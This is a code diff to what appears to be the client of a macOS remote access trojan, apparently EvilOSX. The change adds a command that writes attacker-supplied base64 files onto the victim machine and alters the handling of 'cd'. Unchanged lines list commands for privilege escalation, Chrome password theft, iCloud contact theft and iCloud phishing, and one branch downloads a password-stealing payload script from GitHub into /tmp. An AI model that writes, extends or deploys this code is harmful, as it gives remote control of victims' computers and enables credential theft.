@@ -211,6 +211,7 @@ def get_help():
     help += "get_info          -  Show basic information about the client.\n"
     help += "get_root          -  Attempt to get root via local privilege escalation.\n"
     help += "download <path>   -  Downloads the file to the local machine.\n"
+    help += "upload <path>     -  Uploads the file to the remote machine.\n"
     help += "chrome_passwords  -  Retrieve Chrome passwords.\n"
     help += "icloud_contacts   -  Retrieve iCloud contacts.\n"
     help += "icloud_phish      -  Attempt to get iCloud password via phishing.\n"
@@ -422,6 +423,14 @@ def start_server():
                                 send_response(server_socket, MESSAGE_ATTENTION + "Failed to download: Empty file.")
                             else:
                                 send_response(server_socket, encoded_file)
+                elif command.startswith("upload"):
+                    file_name = command.split(" ")[1]
+                    encoded_file = command.split(" ")[2]
+
+                    with open(file_name, "wb") as open_file:
+                        open_file.write(base64.b64decode(encoded_file))
+
+                        send_response(server_socket, MESSAGE_INFO + "File uploaded to: " + os.getcwd() + "/" + file_name)
                 elif command == "chrome_passwords":
                     payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
                     payload_file = "/tmp/chrome_passwords.py"
@@ -521,7 +530,7 @@ def start_server():
                     # Regular shell command
                     if len(command) > 3 and command[0:3] == "cd ":
                         try:
-                            os.chdir(command[3:])
+                            os.chdir(os.path.expanduser(command[3:]))
                             send_response(server_socket, "EMPTY")
                         except Exception:
                             send_response(server_socket, "EMPTY")
